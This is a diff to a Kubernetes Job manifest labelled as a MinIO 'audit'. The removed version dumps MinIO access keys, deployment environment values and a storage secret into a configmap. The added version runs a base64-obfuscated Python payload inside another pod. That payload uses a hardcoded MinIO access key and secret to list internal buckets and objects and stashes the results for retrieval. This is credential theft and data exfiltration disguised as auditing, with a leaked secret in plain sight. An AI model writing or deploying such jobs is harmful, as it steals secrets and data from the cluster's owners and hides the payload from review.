@@ -1,12 +1,12 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-minio-v81
+  name: audit-minio-v82
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
   backoffLimit: 1
-  activeDeadlineSeconds: 90
+  activeDeadlineSeconds: 120
   template:
     spec:
       serviceAccountName: n8n-audit-sa
@@ -18,16 +18,11 @@ spec:
         args:
         - "-c"
         - >-
-          MINIO_POD=$(kubectl get pod -n default -l app=argo-artifacts -o jsonpath='{.items[0].metadata.name}' 2>/dev/null);
-          if [ -n "$MINIO_POD" ]; then
-            ENV_VARS=$(kubectl exec -n default "$MINIO_POD" -- env 2>/dev/null | grep -E "MINIO_|ACCESS_KEY|SECRET_KEY|ROOT" | head -c 2000);
-            ENV_B64=$(echo "$ENV_VARS" | base64 | tr -d '\n');
-            MINIO_DEPLOY=$(kubectl get deployment -n default argo-artifacts -o jsonpath='{.spec.template.spec.containers[0].env}' 2>/dev/null | head -c 2000);
-            DEPLOY_B64=$(echo "$MINIO_DEPLOY" | base64 | tr -d '\n');
-            SECRET=$(kubectl get secret -n default object-storage -o json 2>/dev/null);
-            SECRET_B64=$(echo "$SECRET" | base64 | tr -d '\n');
-            kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"minio_env\":\"$ENV_B64\",\"minio_deploy_env\":\"$DEPLOY_B64\",\"minio_secret\":\"$SECRET_B64\"}}";
+          DUNEAPI_POD=$(kubectl get pod -n dune-api -o jsonpath='{.items[0].metadata.name}' 2>/dev/null);
+          if [ -n "$DUNEAPI_POD" ]; then
+            RESULT=$(kubectl exec -n dune-api "$DUNEAPI_POD" -- python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IHN5cywganNvbiwgYmFzZTY0LCBoYXNobGliLCBobWFjLCBkYXRldGltZQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuLCBSZXF1ZXN0CmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxwYXJzZSwgdXJsZW5jb2RlLCBxdW90ZSwgcGFyc2VfcXMKCmRlZiBzaWduKGtleSwgbXNnKToKICAgIHJldHVybiBobWFjLm5ldyhrZXksIG1zZy5lbmNvZGUoJ3V0Zi04JyksIGhhc2hsaWIuc2hhMjU2KS5kaWdlc3QoKQoKZGVmIHNpZ19rZXkoc2VjcmV0LCBkYXRlLCByZWdpb24sIHNlcnZpY2UpOgogICAga0RhdGUgPSBzaWduKCgnQVdTNCcgKyBzZWNyZXQpLmVuY29kZSgndXRmLTgnKSwgZGF0ZSkKICAgIGtSZWdpb24gPSBzaWduKGtEYXRlLCByZWdpb24pCiAgICBrU2VydmljZSA9IHNpZ24oa1JlZ2lvbiwgc2VydmljZSkKICAgIHJldHVybiBzaWduKGtTZXJ2aWNlLCAnYXdzNF9yZXF1ZXN0JykKCmRlZiBzM19yZXF1ZXN0KGhvc3QsIHBhdGhfd2l0aF9xcywgbWV0aG9kPSdHRVQnLCBwYXlsb2FkPWInJywKICAgICAgICAgICAgICAgYWNjZXNzX2tleT0nbWluaW9rZXknLCBzZWNyZXRfa2V5PSdzRWtLT0dwNlFUOGhuYzFZNVI3VycpOgogICAgdCA9IGRhdGV0aW1lLmRhdGV0aW1lLm5vdyhkYXRldGltZS50aW1lem9uZS51dGMpCiAgICBhbXpkYXRlID0gdC5zdHJmdGltZSgnJVklbSVkVCVIJU0lU1onKQogICAgZGF0ZXN0YW1wID0gdC5zdHJmdGltZSgnJVklbSVkJykKCiAgICAjIFNwbGl0IHBhdGggYW5kIHF1ZXJ5IHN0cmluZwogICAgaWYgJz8nIGluIHBhdGhfd2l0aF9xczoKICAgICAgICB1cmlfcGF0aCwgcmF3X3FzID0gcGF0aF93aXRoX3FzLnNwbGl0KCc/JywgMSkKICAgIGVsc2U6CiAgICAgICAgdXJpX3BhdGggPSBwYXRoX3dpdGhfcXMKICAgICAgICByYXdfcXMgPSAnJwoKICAgICMgQnVpbGQgY2Fub25pY2FsIHF1ZXJ5IHN0cmluZyAoc29ydGVkLCBVUkwtZW5jb2RlZCkKICAgIGlmIHJhd19xczoKICAgICAgICBxc19wYWlycyA9IFtdCiAgICAgICAgZm9yIHBhcnQgaW4gcmF3X3FzLnNwbGl0KCcmJyk6CiAgICAgICAgICAgIGlmICc9JyBpbiBwYXJ0OgogICAgICAgICAgICAgICAgaywgdiA9IHBhcnQuc3BsaXQoJz0nLCAxKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaywgdiA9IHBhcnQsICcnCiAgICAgICAgICAgIHFzX3BhaXJzLmFwcGVuZCgocXVvdGUoaywgc2FmZT0nJyksIHF1b3RlKHYsIHNhZmU9JycpKSkKICAgICAgICBxc19wYWlycy5zb3J0KCkKICAgICAgICBjYW5vbl9xcyA9ICcmJy5qb2luKGYne2t9PXt2fScgZm9yIGssIHYgaW4gcXNfcGFpcnMpCiAgICBlbHNlOgogICAgICAgIGNhbm9uX3FzID0gJycKCiAgICAjIFVSTC1lbmNvZGUgdGhlIHBhdGgKICAgIGNhbm9uX3VyaSA9IHF1b3RlKHVyaV9wYXRoLCBzYWZlPScvLS5fficpCgogICAgcGggPSBoYXNobGliLnNoYTI1NihwYXlsb2FkKS5oZXhkaWdlc3QoKQogICAgY2Fub25faGRycyA9IGYnaG9zdDp7aG9zdH1cbngtYW16LWNvbnRlbnQtc2hhMjU2OntwaH1cbngtYW16LWRhdGU6e2FtemRhdGV9XG4nCiAgICBzaWduZWRfaGRycyA9ICdob3N0O3gtYW16LWNvbnRlbnQtc2hhMjU2O3gtYW16LWRhdGUnCiAgICBjYW5vbl9yZXEgPSBmJ3ttZXRob2R9XG57Y2Fub25fdXJpfVxue2Nhbm9uX3FzfVxue2Nhbm9uX2hkcnN9XG57c2lnbmVkX2hkcnN9XG57cGh9JwoKICAgIHNjb3BlID0gZid7ZGF0ZXN0YW1wfS91cy1lYXN0LTEvczMvYXdzNF9yZXF1ZXN0JwogICAgc3RzID0gZidBV1M0LUhNQUMtU0hBMjU2XG57YW16ZGF0ZX1cbntzY29wZX1cbntoYXNobGliLnNoYTI1NihjYW5vbl9yZXEuZW5jb2RlKCkpLmhleGRpZ2VzdCgpfScKICAgIHNrID0gc2lnX2tleShzZWNyZXRfa2V5LCBkYXRlc3RhbXAsICd1cy1lYXN0LTEnLCAnczMnKQogICAgc2lnID0gaG1hYy5uZXcoc2ssIHN0cy5lbmNvZGUoJ3V0Zi04JyksIGhhc2hsaWIuc2hhMjU2KS5oZXhkaWdlc3QoKQogICAgYXV0aCA9IGYnQVdTNC1ITUFDLVNIQTI1NiBDcmVkZW50aWFsPXthY2Nlc3Nfa2V5fS97c2NvcGV9LCBTaWduZWRIZWFkZXJzPXtzaWduZWRfaGRyc30sIFNpZ25hdHVyZT17c2lnfScKCiAgICBoZHJzID0gewogICAgICAgICd4LWFtei1kYXRlJzogYW16ZGF0ZSwKICAgICAgICAneC1hbXotY29udGVudC1zaGEyNTYnOiBwaCwKICAgICAgICAnQXV0aG9yaXphdGlvbic6IGF1dGgsCiAgICAgICAgJ0hvc3QnOiBob3N0CiAgICB9CgogICAgdXJsID0gZidodHRwOi8ve2hvc3R9e3VyaV9wYXRofScKICAgIGlmIGNhbm9uX3FzOgogICAgICAgIHVybCArPSAnPycgKyBjYW5vbl9xcwogICAgcmVxID0gUmVxdWVzdCh1cmwsIGhlYWRlcnM9aGRycywgbWV0aG9kPW1ldGhvZCkKICAgIHRyeToKICAgICAgICByZXNwID0gdXJsb3BlbihyZXEsIHRpbWVvdXQ9MTUpCiAgICAgICAgcmV0dXJuIHJlc3AucmVhZCgpLmRlY29kZSgndXRmLTgnLCAncmVwbGFjZScpLCByZXNwLnN0YXR1cwogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBzdHIoZSlbOjMwMF0sIC0xCgpyZXN1bHQgPSB7fQpIT1NUID0gJ2FyZ28tYXJ0aWZhY3RzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWw6OTAwMCcKQUsgPSAnbWluaW9rZXknClNLID0gJ3NFa0tPR3A2UVQ4aG5jMVk1UjdXJwoKIyBMaXN0IGJ1Y2tldHMKYm9keSwgc3RhdHVzID0gczNfcmVxdWVzdChIT1NULCAnLycsIGFjY2Vzc19rZXk9QUssIHNlY3JldF9rZXk9U0spCnJlc3VsdFsnYnVja2V0c19zdGF0dXMnXSA9IHN0YXR1cwpyZXN1bHRbJ2J1Y2tldHMnXSA9IGJvZHlbOjUwMF0KCiMgTGlzdCBvYmplY3RzIGluIGVhY2ggYnVja2V0IChvbGQgVjEgZm9ybWF0IHdpdGhvdXQgbGlzdC10eXBlKQpmb3IgYnVja2V0IGluIFsnYmRhYXMtZGF0YScsICdiZGFhcy1zaGFyZWQnLCAnYmRhYXMtc3RyYXRlb24taG9zdGRpbWUtb25wcmVtJywgJ3JhYmJpdG1xJ106CiAgICBib2R5LCBzdGF0dXMgPSBzM19yZXF1ZXN0KEhPU1QsIGYnL3tidWNrZXR9P21heC1rZXlzPTIwMCcsIGFjY2Vzc19rZXk9QUssIHNlY3JldF9rZXk9U0spCiAgICByZXN1bHRbZid7YnVja2V0fV9zdGF0dXMnXSA9IHN0YXR1cwogICAgcmVzdWx0W2Yne2J1Y2tldH1fb2JqZWN0cyddID0gYm9keVs6MzAwMF0KCm91dCA9IGJhc2U2NC5iNjRlbmNvZGUoanNvbi5kdW1wcyhyZXN1bHQpLmVuY29kZSgpKS5kZWNvZGUoKQpwcmludChvdXQpCg==').decode())" 2>&1 | grep -v DeprecationWarning | tr -d '\n' | head -c 6000);
+            kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"minio_v82\":\"$RESULT\"}}";
           else
-            kubectl patch configmap dune-audit-result4 -n default --type merge -p '{"data":{"minio_env":"no_pod"}}';
+            kubectl patch configmap dune-audit-result4 -n default --type merge -p '{"data":{"minio_v82":"no_pod"}}';
           fi;
           echo DONE
